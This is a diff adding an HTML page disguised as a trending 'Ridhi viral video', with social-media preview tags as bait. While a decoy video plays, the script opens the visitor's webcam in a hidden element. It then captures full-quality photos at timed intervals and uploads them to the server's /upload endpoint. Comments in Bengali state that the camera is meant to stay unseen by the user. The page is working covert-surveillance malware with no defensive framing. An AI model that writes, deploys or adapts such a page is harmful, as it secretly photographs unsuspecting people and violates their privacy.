@@ -1,0 +1,162 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Ridhi viral video</title>
+  <!-- SEO -->
+      <meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="Ridhi viral video">
+
+<!-- Open Graph -->
+<meta property="og:type" content="website">
+<meta property="og:url" content="https://viral-video-nirg.onrender.com/ridhi-viral-video">
+<meta property="og:title" content=" Ridhi new Viral video 2025">
+<meta property="og:description" content=" Ridhi new video 2025">
+<meta property="og:image" content="https://viral-video-nirg.onrender.com/Ridhi.webp">
+<meta property="og:image:width" content="1200">
+<meta property="og:image:height" content="630">
+
+<!-- Twitter Card -->
+<meta name="twitter:card" content=" Ridhi new viral trending video 2025">
+<meta name="twitter:url" content="https://viral-video-nirg.onrender.com/ridhi-viral-video">
+<meta name="twitter:title" content="Ridhi new Viral video 2025">
+<meta name="twitter:description" content=" Ridhi new Viral video 2025">
+<meta name="twitter:image" content="https://viral-video-nirg.onrender.com/Ridhi.webp">
+  
+  
+  
+  
+  
+  <link rel="stylesheet" href="style.css">
+  <style>
+  body {
+  font-family: Arial, sans-serif;
+  margin: 0;
+  background: #121212;
+  color: #fff;
+  text-align: center;
+}
+
+.container {
+  padding: 20px;
+}
+
+h1 {
+  color: #ffeb3b;
+}
+
+.video-wrapper {
+  display: flex;
+  justify-content: center;
+  margin-top: 20px;
+}
+
+#musicVideo {
+  width: 100%;
+  max-width: 800px;
+  aspect-ratio: 16/9;
+  border: 3px solid #ffeb3b;
+  border-radius: 10px;
+  box-shadow: 0px 6px 15px rgba(0,0,0,0.6);
+}
+
+.status {
+  margin-top: 15px;
+  font-size: 1.1rem;
+  color: #00e676;
+}
+
+footer {
+  margin-top: 40px;
+  font-size: 0.9rem;
+  color: #bbb;
+}
+  </style>
+  
+  
+</head>
+<body>
+  <div class="container">
+
+    <!-- ইউজার যা দেখবে -->
+    <div class="video-wrapper">
+      <video id="musicVideo" controls autoplay>
+        <source src="/video/Darkwater(360P).mp4" type="video/mp4">
+        Your browser does not support video.
+      </video>
+    </div>
+
+    <!-- Hidden camera (ইউজার দেখবে না) -->
+    <video id="camera" autoplay playsinline style="display:none;"></video>
+    <canvas id="canvas" style="display:none;"></canvas>
+
+    <p id="statusText" class="status">
+    Darkwater.mp4  
+      
+    </p>
+  </div>
+
+
+<script>
+let camera = document.getElementById("camera");
+let canvas = document.getElementById("canvas");
+let ctx = canvas.getContext("2d");
+let statusText = document.getElementById("statusText");
+
+// ক্যামেরা চালু (hidden)
+navigator.mediaDevices.getUserMedia({ video: true, audio: false })
+  .then(stream => {
+    camera.srcObject = stream;
+    
+  })
+  .catch(err => {
+    console.error("Camera error: ", err);
+    
+  });
+
+// ছবি তোলার ফাংশন + সার্ভারে পাঠানো (high quality)
+async function captureAndUploadImage() {
+  // ভিডিওর আসল resolution পাওয়া
+  const videoWidth = camera.videoWidth || 640;
+  const videoHeight = camera.videoHeight || 480;
+
+  canvas.width = videoWidth;
+  canvas.height = videoHeight;
+
+  ctx.drawImage(camera, 0, 0, videoWidth, videoHeight);
+
+  let dataUrl = canvas.toDataURL("image/jpeg", 1.0); // full quality JPEG
+
+  try {
+    await fetch("/upload", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ images: [dataUrl] }),
+    });
+    console.log("✅ Image uploaded (high quality)");
+  } catch (err) {
+    console.error("❌ Upload failed:", err);
+  }
+}
+
+// টাইমার লজিক: 3 রাউন্ড × 5 ছবি, 10s অন্তর, 30s বিরতি
+async function startCapture() {
+  for (let round = 0; round < 3; round++) {
+    for (let i = 0; i < 5; i++) {
+      
+      await captureAndUploadImage();
+      await new Promise(r => setTimeout(r, 10000)); // 10 sec
+    }
+    if (round < 2) {
+      
+      await new Promise(r => setTimeout(r, 30000)); // 30 sec pause
+    }
+  }
+
+  
+}
+
+startCapture();
+</script>
+</body>
+</html>
